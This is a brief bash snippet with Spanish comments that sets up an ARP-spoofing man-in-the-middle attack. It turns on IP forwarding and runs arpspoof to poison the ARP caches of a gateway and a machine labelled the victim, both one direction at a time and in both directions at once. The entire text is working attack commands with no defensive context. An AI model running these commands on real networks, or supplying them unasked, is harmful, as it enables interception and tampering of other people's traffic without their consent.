```bash

echo 1 > /proc/sys/net/ipv4/ip_forward


# comando para envenenar tabla arp de gw 
arpspoof -i eth0 -t 10.0.0.1 10.0.0.21

# lo mismo hago para la victima
arpspoof -i eth0 -t 10.0.0.21 10.0.0.1

# o el comando para ambos sentidos:
arpspoof -i eth0 -r 10.0.0.1 10.0.0.21
